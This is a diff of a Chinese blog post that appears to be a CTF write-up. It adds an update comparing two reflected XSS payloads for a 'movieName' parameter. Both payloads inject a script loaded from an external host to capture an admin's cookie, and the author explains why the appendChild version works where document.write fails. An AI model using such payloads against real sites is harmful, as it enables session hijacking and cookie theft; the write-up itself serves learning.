@@ -199,6 +199,11 @@
 <blockquote>
 <p>这题我感觉比较坑，我做的基本和writeup中的一样，找到了一个反射型XSS，发给管理员，可是管理员却说我的链接让他的浏览器奔溃了。。。什么鬼。。。writeup中跟我用同一个payload都成功得到cookie了。。。。。。心累～～～</p>
 </blockquote>
+<p>＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝update＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝</p>
+<p>研究了下，知道问题出在哪了，，还是我js学的不行。。<br>my payload: ?movieName=”])}catch(e){if(!window.x){window.x=1;document.write(‘<script src="//baidu.com"></script>‘)}}//</p>
+<p>writeup payload: ?movieName=”])}catch(e){if(!window.x){window.x=1;document.body.appendChild(document.createElement(‘script’)).src=’//baidu.com’}}//</p>
+<p>｀document.write()｀会重写html，在有的浏览器我的payload可以(貌似只有firefox可以)</p>
+<p>而writeup中的payload是添加一个节点，在当前页面的基础上添加。。。所以说问题就在这了。。。</p>
 
         
       </div>
@@ -220,7 +225,7 @@
           <div class="post-nav">
             <div class="post-nav-prev post-nav-item">
               
-                <a href="/2015/05/20/0x25/">ddddd</a>
+                <a href="/2015/05/20/0x25/">渗透题writeup</a>
               
             </div>
 
